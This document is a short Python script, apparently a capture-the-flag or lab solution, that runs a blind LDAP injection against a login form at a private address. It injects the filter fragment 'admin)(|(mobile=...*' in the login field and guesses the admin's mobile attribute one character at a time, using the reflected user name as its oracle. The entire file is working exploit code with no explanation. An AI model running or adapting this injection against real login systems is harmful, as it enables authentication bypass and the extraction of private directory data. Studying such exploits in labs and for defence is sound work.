import requests, string

HOST = "192.168.56.101"
PORT = 5000
URL = f"http://{HOST}:{PORT}/"
ADMIN_USER_NAME = "admin"

ALPHABET = string.ascii_letters + string.digits

def main():
	flag = ""

	while True:
		is_found = False

		for c in ALPHABET:
			data = {
				"login": f"{ADMIN_USER_NAME})(|(mobile={flag}{c}*",
				"password": "1)"
			}
			r = requests.post(URL, data = data)

			if ADMIN_USER_NAME in r.text:
				flag += c
				is_found = True
				print(flag)
				break

		if not is_found:
			break

if __name__ == '__main__':
	main()